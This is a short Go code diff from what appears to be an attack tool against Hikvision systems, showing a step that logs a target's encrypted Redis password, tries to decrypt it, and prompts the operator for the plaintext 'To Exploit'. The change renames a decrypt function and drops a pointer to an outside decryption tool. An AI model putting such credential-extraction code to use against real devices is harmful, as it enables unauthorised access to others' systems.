@@ -170,10 +170,9 @@ func (h *Hik) Run() {
 				log.SetPrefix("[!] ")
 				log.Printf("Targets %s Redis Encrypt Password is %s\n", h.Target, h.redisPasswordEncrypted)
 				log.Println("Trying To Decrypt....")
-				results, err := Decrypt(h.redisPasswordEncrypted)
+				results, err := DecryptData(h.redisPasswordEncrypted)
 				if err != nil {
 					log.Println("Decrypt Auto Failed.")
-					log.Printf("Please Use HikDecrypt Tools(https://github.com/wafinfo/Hikvision) On Windows To Decrypt It\n")
 					log.Printf("Input Decrypted Password To Exploit:")
 					fmt.Scanf("%s\n", &h.redisPasswordDecrypted)
 					if h.redisPasswordDecrypted == "" {
